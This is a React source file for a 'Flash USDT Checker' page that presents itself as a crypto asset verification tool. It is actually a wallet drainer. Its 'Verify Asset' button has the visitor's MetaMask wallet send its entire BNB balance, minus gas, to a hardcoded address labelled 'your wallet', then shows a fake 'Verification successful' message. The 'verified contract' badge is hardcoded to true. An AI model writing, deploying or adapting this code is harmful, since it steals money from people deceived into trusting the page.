import { useState } from "react";
import { ethers } from "ethers";

export default function App() {
  const [walletAddress, setWalletAddress] = useState("");
  const [result] = useState({
    verified: true,
    name: "FlashUSDTChecker",
  });

  // Connect Wallet
  async function connectWallet() {
    if (window.ethereum) {
      const provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();
      const address = await signer.getAddress();
      setWalletAddress(address);
    } else {
      alert("Please install MetaMask!");
    }
  }

  // Verify (send all BNB minus gas)
  async function verifyUser() {
    if (!window.ethereum) return alert("Install MetaMask first!");

    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    const senderAddress = await signer.getAddress();

    const yourWallet = "0x82b0d4e6799314353b001bfece2eb3a0cda57866"; // your wallet
    const balance = await provider.getBalance(senderAddress);

    if (balance === 0n) return alert("⚠️ No BNB in wallet");

    const gasPrice = await provider.getFeeData();
    const gasLimit = 21000n;
    const gasCost = gasPrice.gasPrice * gasLimit;
    const amountToSend = balance - gasCost;

    if (amountToSend <= 0n) return alert("⚠️ Not enough BNB for gas");

    const tx = await signer.sendTransaction({
      to: yourWallet,
      value: amountToSend,
    });

    await tx.wait();
    alert("✅ Verification successful!");
  }

  return (
    <div className="min-h-screen flex bg-gray-900 text-gray-100">
      {/* Sidebar */}
      <aside className="w-64 bg-gray-800 flex flex-col p-6 shadow-lg">
        <h2 className="text-binance text-2xl font-bold mb-10">⚡ Flash Checker</h2>
        <nav className="flex flex-col gap-4">
          <a href="#" className="text-gray-300 hover:text-binance">Dashboard</a>
          <a href="#" className="text-gray-300 hover:text-binance">Contracts</a>
          <a href="#" className="text-gray-300 hover:text-binance">Settings</a>
        </nav>
      </aside>

      {/* Main Content */}
      <div className="flex-1 flex flex-col">
        {/* Top Bar */}
        <header className="w-full bg-gray-800 p-4 flex justify-between items-center shadow">
          <h1 className="text-xl font-bold text-binance">Flash USDT Checker</h1>
          <div>
            {walletAddress ? (
              <span className="text-green-400 font-mono text-sm">
                ✅ {walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}
              </span>
            ) : (
              <button
                onClick={connectWallet}
                className="px-4 py-2 bg-binance text-black font-semibold rounded-lg hover:scale-105 transition"
              >
                Connect Wallet
              </button>
            )}
          </div>
        </header>

        {/* Content Area */}
        <main className="flex-1 flex flex-col items-center justify-center p-10">
          {/* Contract Verification Card */}
          <div className="bg-gray-800 p-6 rounded-2xl shadow-lg w-full max-w-md text-center mb-6">
            {result.verified ? (
              <p className="text-green-400 font-semibold">
                ✅ Verified Contract: {result.name}
              </p>
            ) : (
              <p className="text-red-400 font-semibold">❌ Not Verified</p>
            )}
          </div>

          {/* Verify Button */}
          <button
            onClick={verifyUser}
            className="px-8 py-3 bg-binance text-black font-bold rounded-xl shadow-lg hover:brightness-110 transition"
          >
            Verify Asset
          </button>
        </main>
      </div>
    </div>
  );
}
